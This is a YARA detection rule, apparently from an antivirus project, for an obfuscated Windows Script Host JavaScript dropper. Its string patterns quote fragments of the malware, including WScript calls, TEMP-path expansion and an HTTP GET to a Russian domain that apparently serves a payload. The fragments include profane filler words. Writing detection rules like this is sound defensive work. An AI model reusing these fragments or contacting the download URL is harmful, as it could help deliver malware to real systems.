rule sig_20160428_c471f560c2d652a09610ec3113dc61bb {
  meta:
    description = "datamaliciousorder - file 20160428_c471f560c2d652a09610ec3113dc61bb.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "0734415e9c6a9beb2da4f369b519287fe212f30c9f1319e001a3ba798d771f37"

  strings:
    $s1  = "function EeiFamMndRntImvOznYdi(DbiSesHlqSfxUvbNkkUhn){WasCjeZogWoeEpdBrsPjh[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function EeiFamMndRntImvOznYdi(DbiSesHlqSfxUvbNkkUhn){WasCjeZogWoeEpdBrsPjh[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function FarAkdCksKlvVeaJqgWoj() {return WasCjeZogWoeEpdBrsPjh[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "function NdaQbbOfgMynCygBijZic(UumZmrBklZwpEgyAlbHlr, AnyRoeQsgXriNdbTxnQxa){YjdFviAyiNpuMspPwlXkp = YjdFviAyiNpuMspPwlXkp * 1; " ascii
    $s5  = "return UumZmrBklZwpEgyAlbHlr - AnyRoeQsgXriNdbTxnQxa;};" fullword ascii
    $s6  = "var WasCjeZogWoeEpdBrsPjh = function QubFzrEgqJqoIlwUzxRcl() {return ZfsJesWfyDlnAtfAhgFke[NepFkfBwuBhzHqfUycYaj](\"WScript\"+\"" ascii
    $s7  = "var ZfsJesWfyDlnAtfAhgFke = this[\"WScript\"];" fullword ascii
    $s8  = "var WasCjeZogWoeEpdBrsPjh = function QubFzrEgqJqoIlwUzxRcl() {return ZfsJesWfyDlnAtfAhgFke[NepFkfBwuBhzHqfUycYaj](\"WScript\"+\"" ascii
    $s9  = "function FrmIcdDllDcwIvoFdgDnc(){return NepFkfBwuBhzHqfUycYaj;};" fullword ascii
    $s10 = "function FarAkdCksKlvVeaJqgWoj() {return WasCjeZogWoeEpdBrsPjh[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "if (NhpBebYsbVgbSnlIimPqk[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s12 = "function NdaQbbOfgMynCygBijZic(UumZmrBklZwpEgyAlbHlr, AnyRoeQsgXriNdbTxnQxa){YjdFviAyiNpuMspPwlXkp = YjdFviAyiNpuMspPwlXkp * 1; " ascii
    $s13 = "function EemTkjOqkGarGubTutEuo(){return TtdLyyCpoWjuTdaPvkWkn + \"\";};" fullword ascii
    $s14 = "function DbsBmoOwdSurSjpDrnBlc() {return ((KsaZwiIywDvqAfkHiqXrm == true) && (KsaZwiIywDvqAfkHiqXrm == GvzSbgNlzNtoWbpVfgOiw)) ?" ascii
    $s15 = "NhpBebYsbVgbSnlIimPqk[XhwQzaAesWsvTqdCjlKcu](\"G\" + \"ET\", \"http://cafe-vintage68.ru/asad2fl\", false);" fullword ascii
    $s16 = "function DbsBmoOwdSurSjpDrnBlc() {return ((KsaZwiIywDvqAfkHiqXrm == true) && (KsaZwiIywDvqAfkHiqXrm == GvzSbgNlzNtoWbpVfgOiw)) ?" ascii
    $s17 = "function JxeGueVwmEpbJszWfyHjb(){return 23;};" fullword ascii
    $s18 = "function QnbYcbJpvIbxUzfLvaXbc()" fullword ascii
    $s19 = "GvzSbgNlzNtoWbpVfgOiw = true; " fullword ascii
    $s20 = "}while (WsfZiiKsiNwyJqvBgzKpk);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}